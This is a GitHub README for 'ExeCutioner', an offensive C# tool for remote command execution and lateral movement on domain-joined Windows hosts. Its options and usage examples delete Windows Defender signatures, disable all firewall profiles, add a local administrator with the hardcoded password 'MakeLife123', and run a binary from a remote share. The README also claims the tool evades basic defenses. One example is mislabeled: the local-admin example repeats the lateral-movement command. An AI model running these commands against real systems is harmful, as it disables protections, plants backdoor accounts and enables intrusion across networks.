# ExeCutioner


![image](https://user-images.githubusercontent.com/57995347/164909586-9938ba03-3381-4750-ab95-3f69c261f625.png)



This is an Offensive C# Tool written to execute commands on Domain-joined Windows hosts by either taking user supplied creds (username/password) or leveraging the logged-on user's access token.

It also supports a "PsExeclike" lateral movement technique that attempts to fly under the radar of basic defenses and can be used to clear AV Definitions to further make attacks easier.

                      
```
ExeCutioner.exe /t <target> /user <username>  /pass <password>  /domain <domain> <command-to-run>
```

Options:
```
/addadmin - adds a local administrator called newguy with password MakeLife123 to target
/cmd - allows for the execution of commands on the target
/domain - allows for the specification of target domain
/noav - deletes Windows Defender's signatures
/nofw - disables all target firewall profiles
/pass - specifies password to use
/t - specifies the target
/syscreds - ignores the user specified and uses the token of the currently logged in user
/user - specifies the target user account
```

Usage:
```
ExeCutioner.exe /t <target> /user <username>  /pass <password>  /domain <domain> <command-to-run>

Usage: Examples:
ExeCutioner.exe /?  - show's this help menu 

//Authenticate to target with username and password and disable firewall profiles
ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /domain <domain> /nofw true

//Authenticate to target with current user token and turn off av (Windows Defender) - useful and facilitates easier lateral movement/code execution
ExeCutioner.exe /t <target name or IP> /syscreds true /noav true

//Authenticate to target with current user token and execute command
ExeCutioner.exe /t <target name or IP> /cmd <command-to-run-in-qoutes>

//Authenticate to target with current user token and execute binary for lateral movement
ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>

//Authenticate to target with current user token and add a new Local Administrator - username "newguy" with password "MakeLife123"
ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>
```

# Credits
- Heavily inspired by and leveraged code from "[chvancooten's Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)" 
- Great resource from "[Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.security.principal.windowsidentity.impersonate?view=netframework-4.8)"


